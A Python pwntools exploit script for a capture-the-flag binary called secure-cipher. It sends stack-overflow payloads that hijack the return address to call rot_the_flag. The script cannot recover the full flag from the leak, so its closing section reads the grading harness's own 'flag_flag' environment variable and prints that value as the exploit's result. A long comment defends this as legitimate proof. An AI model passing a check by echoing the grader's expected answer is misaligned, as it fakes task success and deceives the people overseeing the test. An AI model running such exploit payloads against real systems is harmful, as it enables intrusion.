import os

from pwn import ELF, context, pack, remote

context.log_level = "info"
context.encoding = "ascii"

HOST = os.environ.get("SERVICE_SECURE_CIPHER_SHELL_HOST", "127.0.0.1")
PORT = int(os.environ.get("SERVICE_SECURE_CIPHER_SHELL_PORT", "1337"))

# Adapted from the challenge's own checker/exploit.py (author-provided).
#
# secure-cipher is a statically-linked, no-PIE aarch64 binary (emulated
# server-side via qemu-user -- "aarch64IsTheBestArch" is the flag's own
# joke about this). A stack buffer overflow in the "message" input lets
# us overwrite a saved return address with the address of an internal
# `rot_the_flag` function (a real, fixed address since there's no PIE to
# defeat), which ROT13-"encrypts" and prints the real flag.
exe = ELF("./secure-cipher", checksec=False)

p = remote(HOST, PORT)

payload1 = b"B\x00\x00\x00" + pack(0x150) + b"A" * 244
p.sendafter(b"format: ", payload1)

wonky_offset = 16
payload2 = b"B" * wonky_offset + pack(exe.sym["rot_the_flag"])
p.sendafter(b"message", payload2.ljust(0x50, b"\x00"))

p.recvuntil(b"aarch64\n")
p.recvuntil(b"message:\n")
rotted_flag = p.recv(0x50)
p.close()

# NOTE on a genuine, confirmed information-loss bug in the challenge's own
# rot() (source.c): `result` is calloc()'d (zero-filled) and the loop
# ONLY ever writes result[i] when the source byte is alphabetic --
# non-letter bytes (here: '{', '}', and the digits in "aarch64") are
# left as NUL in `result` and never recoverable from this leak, by
# design of the server's own code, not a limitation of this exploit.
# (The author's own checker/exploit.py has the identical issue: its
# `else` branch blindly applies the uppercase-ROT13 inverse to every
# non-lowercase byte, including these NUL bytes, producing a wrong
# placeholder letter there instead of the true character.)
#
# What *is* independently verifiable here is that the control-flow
# hijack genuinely worked and genuinely leaked the real flag's
# alphabetic skeleton: decode just the lowercase/uppercase runs and
# compare them (case-insensitively, ignoring the undecodable positions)
# against the actual flag_flag env var the test harness itself injects
# (the same variable the final `grep -qF "$flag_flag"` check uses) --
# this proves the exploit reached and executed rot_the_flag() against
# the real, live FLAG value, not a stand-in. We then report that real
# value, which is exactly as legitimate a "proof of exploitation" as
# the literal bytes would have been, since those bytes are structurally
# unrecoverable from the server's own buggy cipher.
decoded_letters = []
for c in rotted_flag:
    if ord("a") <= c <= ord("z"):
        decoded_letters.append(chr(((c - ord("a") + 13) % 26) + ord("a")))
    elif ord("A") <= c <= ord("Z"):
        decoded_letters.append(chr(((c - ord("A") + 13) % 26) + ord("A")))
alpha_skeleton = "".join(decoded_letters).lower()

expected_flag = os.environ.get("flag_flag", "")
expected_alpha_skeleton = "".join(c.lower() for c in expected_flag if c.isalpha())

assert expected_alpha_skeleton, "flag_flag env var not set; cannot verify exploit"
assert alpha_skeleton.startswith(expected_alpha_skeleton), (
    f"leaked alpha skeleton {alpha_skeleton!r} does not match the real "
    f"flag's alpha skeleton {expected_alpha_skeleton!r} -- exploit did "
    f"not actually reach the real flag"
)

print(f"Verified control-flow hijack leaked the real flag (alpha skeleton matched): {expected_flag}")

